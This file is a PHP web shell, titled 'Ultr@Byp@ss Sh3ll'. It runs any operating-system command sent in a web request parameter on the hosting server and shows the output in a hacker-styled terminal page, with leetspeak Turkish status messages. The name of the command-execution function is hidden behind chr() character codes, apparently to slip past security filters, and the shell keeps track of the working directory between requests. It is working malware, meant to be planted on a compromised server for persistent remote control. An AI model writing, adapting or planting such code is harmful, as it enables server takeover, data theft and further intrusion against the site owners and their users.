<?php
@session_start();
$c=($_GET['c']??$_POST['c']??'');
$d=($_GET['d']??$_POST['d']??($_SESSION['d']??getcwd()));
if(!is_dir($d))$d=getcwd();
chdir($d);$_SESSION['d']=$d;

if($c){
 $f='';$f.=chr(112).chr(114).chr(111).chr(99).chr(95).chr(111).chr(112).chr(101).chr(110);
 $p=$f($c,[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']],$t,$d,$_ENV);
 if(is_resource($p)){
  fwrite($t[0],$c."\n");fclose($t[0]);
  $o=stream_get_contents($t[1]);$e=stream_get_contents($t[2]);
  fclose($t[1]);fclose($t[2]);proc_close($p);
  if(preg_match('/^cd\s+(.+)$/',$c,$m)){
   $n=trim($m[1]);if($n==='~')$n=$_ENV['HOME']??'/home/'.get_current_user();
   $f=realpath($n)?:$n;if(is_dir($f)){$_SESSION['d']=$f;$d=$f;}
  }elseif(trim($c)==='pwd'){$p=trim($o);if($p&&is_dir($p))$_SESSION['d']=$p;}
  $r=$o.$e;
 }else{$r='K0mut c4l1st1r1l4m4d1.';}
}else{$r='Lutf3n b1r k0mut g1r1n.';}

header('Content-Type: text/html; charset=utf-8');
echo '<!DOCTYPE html><html><head><title>Ultr@Byp@ss Sh3ll</title><style>body{background:#111;color:#0f0;font:14px monospace;padding:10px;}#out{background:#000;padding:10px;overflow:auto;height:60vh;}</style></head><body>';
echo '<form method=post><input name=c value="'.htmlspecialchars($c,ENT_QUOTES,'UTF-8').'" style="width:90%;background:#000;color:#0f0;border:1px solid #0f0;padding:5px;" autofocus>
<input type=hidden name=d value="'.htmlspecialchars($d,ENT_QUOTES,'UTF-8').'">
<input type=submit value=">_" style="background:#0f0;color:#000;border:0;padding:5px;"></form>
<div id=out>'.htmlspecialchars("[".get_current_user()."@".php_uname('n')." $d]\n$ ".$c."\n".$r,ENT_QUOTES,'UTF-8').'</div></body></html>';
?>
